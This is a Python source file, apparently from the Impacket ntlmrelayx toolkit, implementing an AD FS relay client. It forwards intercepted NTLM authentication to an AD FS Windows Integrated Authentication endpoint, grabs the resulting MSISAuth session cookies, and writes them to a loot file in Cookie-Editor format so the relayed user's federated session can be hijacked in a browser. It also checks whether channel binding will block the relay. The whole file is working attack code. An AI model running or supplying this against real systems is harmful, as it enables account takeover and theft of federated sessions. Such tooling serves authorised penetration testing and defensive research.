# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright Fortra, LLC and its affiliated companies
#
# All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   AD FS Protocol Client
#   Relays NTLMSSP authentication to an AD FS server's Windows Integrated
#   Authentication (WIA) endpoint. On a successful relay the ADFS session
#   cookies (MSISAuth, MSISAuthenticated, ...) are captured and written out in
#   Cookie-Editor JSON format, which can be imported into a browser to ride the
#   relayed user's federated session.
#
#   Sign-in flow driven against the target:
#     1. POST <signon-path>?client-request-id=<guid> to obtain the
#        MSISSamlRequest cookie (the pending sign-in context).
#     2. GET  <wia-path>?client-request-id=<guid> with the relayed NTLM
#        negotiate -> 401 + WWW-Authenticate: NTLM <challenge>.
#     3. GET  <wia-path>?client-request-id=<guid> with the relayed NTLM
#        authenticate -> 302 + Set-Cookie: MSISAuth..., the signed-in session.
#
#   The endpoint paths and user-agent are configurable from the command line
#   (--adfs-wia-path, --adfs-signon-path, --adfs-user-agent).
#
# Author:
#   Client by 0xEr3bus based on the HTTP protocol client by Dirk-jan Mollema / Fox-IT and
#   Alberto Solino (@agsolino). ADFS WIA relay technique by Praetorian
#   (https://github.com/praetorian-inc/ADFSRelay).
#
import re
import ssl
import os
import json
import base64
from uuid import uuid4
from struct import unpack
try:
    from http.client import HTTPConnection, HTTPSConnection
except ImportError:
    from httplib import HTTPConnection, HTTPSConnection

from impacket import LOG
from impacket.examples.ntlmrelayx.clients import ProtocolClient
from impacket.nt_errors import STATUS_SUCCESS, STATUS_ACCESS_DENIED
from impacket.ntlm import NTLMAuthChallenge, NTLMAuthChallengeResponse, AV_PAIRS, NTLMSSP_AV_CHANNEL_BINDINGS
from impacket.spnego import SPNEGO_NegTokenResp

PROTOCOL_CLIENT_CLASSES = ["ADFSRelayClient", "ADFSSRelayClient"]

class ADFSRelayClient(ProtocolClient):
    PLUGIN_NAME = "ADFS"

    def __init__(self, serverConfig, target, targetPort = 443, extendedSecurity=True):
        ProtocolClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)
        self.extendedSecurity = extendedSecurity
        self.negotiateMessage = None
        self.authenticateMessageBlob = None
        self.lastresult = None
        self.clientRequestId = None
        self.msisSamlRequest = None
        self.sessionCookies = []
        # Command line configuration (ntlmrelayx --adfs-* options)
        self.wiaPath = getattr(serverConfig, 'adfs_wia_path', '/adfs/ls/wia')
        self.signonPath = getattr(serverConfig, 'adfs_signon_path', '/adfs/ls/idpinitiatedsignon.aspx')
        self.userAgent = getattr(serverConfig, 'adfs_user_agent', 'Mozilla/5.0 (MSIE 10.0; Windows NT 6.1; Trident/5.0)')

    def initConnection(self):
        self.lastresult = None
        # A single client-request-id ties the whole sign-in together across requests
        self.clientRequestId = str(uuid4())
        # Bootstrap the IdP-initiated sign-on to obtain the MSISSamlRequest cookie
        self.bootstrapSignOn()
        # Persistent connection for the NTLM handshake. Negotiate and authenticate
        # must share one TCP connection, NTLM over HTTP is connection-oriented.
        self.session = self.createConnection()
        return True

    def createConnection(self):
        # AD FS is served over TLS. Only a literal http:// scheme opts out, which is
        # useful against a plaintext test endpoint.
        if self.target.scheme.lower() == 'http':
            return HTTPConnection(self.targetHost, self.targetPort)
        try:
            uv_context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
            uv_context.check_hostname = False
            uv_context.verify_mode = ssl.CERT_NONE
            return HTTPSConnection(self.targetHost, self.targetPort, context=uv_context)
        except AttributeError:
            return HTTPSConnection(self.targetHost, self.targetPort)

    def bootstrapSignOn(self):
        session = self.createConnection()
        body = 'SignInIdpSite=SignInIdpSite&SignInSubmit=Sign+in&SingleSignOut=SingleSignOut'
        path = '%s?client-request-id=%s' % (self.signonPath, self.clientRequestId)
        headers = {'User-Agent': self.userAgent,
                   'Content-Type': 'application/x-www-form-urlencoded',
                   'Content-Length': str(len(body)),
                   'Connection': 'close'}
        try:
            session.request('POST', path, body=body, headers=headers)
            res = session.getresponse()
            res.read()
            self.msisSamlRequest = self.getSetCookie(res, 'MSISSamlRequest')
        except Exception:
            LOG.error('Error while bootstrapping the ADFS sign-on request')
            LOG.debug('Exception:', exc_info=True)
        finally:
            session.close()
        if self.msisSamlRequest is None:
            LOG.error('Did not receive the MSISSamlRequest cookie from %s, IdP-initiated sign-on may be disabled' % self.signonPath)

    def wiaRequest(self, message):
        path = '%s?client-request-id=%s' % (self.wiaPath, self.clientRequestId)
        headers = {'User-Agent': self.userAgent,
                   'Authorization': 'NTLM %s' % base64.b64encode(message).decode('ascii'),
                   'Connection': 'keep-alive'}
        if self.msisSamlRequest is not None:
            headers['Cookie'] = 'MSISSamlRequest=%s' % self.msisSamlRequest
        self.session.request('GET', path, headers=headers)
        return self.session.getresponse()

    def sendNegotiate(self, negotiateMessage):
        res = self.wiaRequest(negotiateMessage)
        res.read()
        try:
            serverChallengeBase64 = re.search('NTLM ([a-zA-Z0-9+/]+={0,2})', res.getheader('WWW-Authenticate')).group(1)
            serverChallenge = base64.b64decode(serverChallengeBase64)
            challenge = NTLMAuthChallenge()
            challenge.fromString(serverChallenge)
            return challenge
        except (IndexError, KeyError, AttributeError):
            LOG.error('No NTLM challenge returned from AD FS server (HTTP %d)' % res.status)
            return False

    def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
        if unpack('B', authenticateMessageBlob[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
            respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
            token = respToken2['ResponseToken']
        else:
            token = authenticateMessageBlob

        self.checkChannelBinding(token)

        res = self.wiaRequest(token)
        res.read()
        if res.status == 401:
            LOG.error('AD FS authentication failed (HTTP 401). Invalid credentials, or EPA/channel binding is blocking the relay')
            return None, STATUS_ACCESS_DENIED

        self.sessionCookies = self.getAllSetCookies(res)
        self.reportSuccess(token, res.status)
        self.lastresult = res
        return None, STATUS_SUCCESS

    def reportSuccess(self, token, status):
        user, domain = self.relayedIdentity(token)
        if domain:
            LOG.info('Successfully authenticated to AD FS as user: %s\\%s' % (domain, user))
        else:
            LOG.info('Successfully authenticated to AD FS as user: %s' % user)

        if len(self.sessionCookies) == 0:
            LOG.info('No session cookies were set by AD FS (HTTP %d)' % status)
            return

        for name, _, _ in self.sessionCookies:
            LOG.info('Captured AD FS session cookie: %s' % name)

        exported = self.exportCookieEditor(self.sessionCookies)
        lootdir = getattr(self.serverConfig, 'lootdir', '.') or '.'
        safe = re.sub('[^A-Za-z0-9._-]', '_', ('%s_%s' % (domain, user)) if domain else user) or 'adfs'
        outputFile = os.path.join(lootdir, 'adfs_cookies_%s.json' % safe)
        try:
            with open(outputFile, 'w') as f:
                json.dump(exported, f, indent=2)
            LOG.info('Dumped AD FS session cookies (Cookie-Editor format) to %s' % outputFile)
        except IOError as e:
            LOG.error('Could not write AD FS session cookies to disk: %s' % str(e))

    def checkChannelBinding(self, token):
        # Mirror of the Praetorian PoC: warn when the relayed authenticate carries a
        # channel binding token, which means the relay will fail against EPA-enforcing AD FS. (ADFS by default has EPA set to Accept)
        try:
            response = NTLMAuthChallengeResponse()
            response.fromString(token)
            # A Net-NTLMv1 response carries a 24-byte NT response with no
            # NTLMv2_CLIENT_CHALLENGE, hence no AV pairs and no channel binding token
            # to inspect (and EPA cannot be enforced against NTLMv1 in the first place).
            if len(response['ntlm']) <= 24:
                LOG.debug('Relayed authenticate is Net-NTLMv1; no channel binding token to inspect')
                return
            # NTProofStr(16) + NTLMv2_CLIENT_CHALLENGE header(28), then the AV pairs
            avPairs = AV_PAIRS(response['ntlm'][44:])
            channelBindings = avPairs[NTLMSSP_AV_CHANNEL_BINDINGS]
            if channelBindings is None:
                return
            if any(b != 0 for b in bytearray(channelBindings)):
                LOG.warning('Client included a non-zero channel binding token, the relay will fail unless AD FS EPA is set to None')
            else:
                LOG.debug('Client included an all-zero channel binding token (EPA-aware client)')
        except Exception:
            LOG.debug('Exception while inspecting the channel binding token:', exc_info=True)

    @staticmethod
    def relayedIdentity(token):
        try:
            response = NTLMAuthChallengeResponse()
            response.fromString(token)
            domain = response['domain_name'].decode('utf-16-le', 'replace')
            user = response['user_name'].decode('utf-16-le', 'replace')
            return user, domain
        except Exception:
            LOG.debug('Could not parse the relayed identity:', exc_info=True)
            return 'unknown', ''

    @staticmethod
    def parseSetCookie(header):
        parts = [p.strip() for p in header.split(';')]
        if len(parts) == 0 or '=' not in parts[0]:
            return None, None, {}
        name, value = parts[0].split('=', 1)
        attrs = {'path': '/', 'secure': False, 'httponly': False, 'domain': None}
        for part in parts[1:]:
            if '=' in part:
                key, val = part.split('=', 1)
                key = key.strip().lower()
                if key in ('path', 'domain'):
                    attrs[key] = val.strip()
            else:
                key = part.strip().lower()
                if key in ('secure', 'httponly'):
                    attrs[key] = True
        return name.strip(), value.strip(), attrs

    def getSetCookie(self, res, name):
        for header in res.msg.get_all('Set-Cookie', []):
            cookieName, cookieValue, _ = self.parseSetCookie(header)
            if cookieName == name:
                return cookieValue
        return None

    def getAllSetCookies(self, res):
        cookies = []
        for header in res.msg.get_all('Set-Cookie', []):
            name, value, attrs = self.parseSetCookie(header)
            if name and value and value.lower() not in ('deleted', ''):
                cookies.append((name, value, attrs))
        return cookies

    def exportCookieEditor(self, cookies):
        exported = []
        for name, value, attrs in cookies:
            exported.append({
                'name': name,
                'value': value,
                'domain': attrs.get('domain') or self.targetHost,
                'hostOnly': attrs.get('domain') is None,
                'path': attrs.get('path') or '/',
                'secure': bool(attrs.get('secure')) or self.target.scheme.lower() != 'http',
                'httpOnly': bool(attrs.get('httponly')),
                'sameSite': 'no_restriction',
                'session': True,
                'firstPartyDomain': '',
                'partitionKey': None,
                'storeId': None,
            })
        return exported

    def getSession(self):
        return self.session

    def keepAlive(self):
        pass

    def killConnection(self):
        if self.session is not None:
            self.session.close()
            self.session = None

class ADFSSRelayClient(ADFSRelayClient):
    PLUGIN_NAME = "ADFSS"

    def __init__(self, serverConfig, target, targetPort = 443, extendedSecurity=True):
        ADFSRelayClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)
